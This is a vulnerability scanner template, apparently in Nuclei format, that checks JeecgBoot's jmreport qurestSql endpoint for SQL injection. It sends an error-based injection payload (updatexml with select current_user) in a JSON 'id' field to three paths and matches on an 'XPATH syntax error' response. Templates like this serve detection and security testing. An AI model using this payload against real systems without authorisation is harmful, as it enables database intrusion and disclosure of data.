id: jeecgboot-qurestsql-sqli
info:
  name: JeecgBoot qurestSql SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection,jeecg-boot

http:
  - method: POST
    path:
      - "{{BaseURL}}/jeecg-boot/jmreport/qurestSql"
      - "{{BaseURL}}/jmreport/qurestSql"
      - "{{BaseURL}}/api/jmreport/qurestSql"
    headers:
      Content-Type: application/json
    body: |
      {"apiSelectId":"1316997232402231297",
      "id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "XPATH syntax error"
        part: body
      - type: word
        condition: and
        negative: true
        words:
          - "select * from"
          - "<"
        part: body
